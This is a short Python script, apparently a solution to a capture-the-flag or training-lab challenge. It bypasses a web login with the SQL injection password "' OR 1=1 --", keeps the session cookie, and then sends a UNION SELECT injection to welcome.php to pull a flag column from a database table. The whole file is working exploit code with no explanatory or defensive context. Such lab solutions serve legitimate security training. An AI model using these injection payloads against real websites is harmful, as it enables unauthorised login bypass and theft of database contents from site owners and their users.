#!/bin/python3

import re
import requests

base_url = input("Please enter the URL of the page: ")

session = requests.Session()


login_data = {
    "username": "anything",
    "password": "' OR 1=1 --",
}

print("Logging in...")

response = session.post(
    f"{base_url}",
    data= {
        "username": "anything",
        "password": "' OR 1=1 --",
    }
)

print(f"Log in successful, PHPSESSID: {session.cookies.get('PHPSESSID')}")

print("Injecting payload...")
response = session.post(
    f"{base_url}/welcome.php",
    data={
        "search": "' UNION SELECT id, flag, 1 FROM more_table --",
        "submit": "Search",
        }
)

match = re.search(r"academy\{[^}]+\}", response.text)

if match:
    print(f"Found flag: {match.group(0)}")
else:
    print("Could not find flag.")
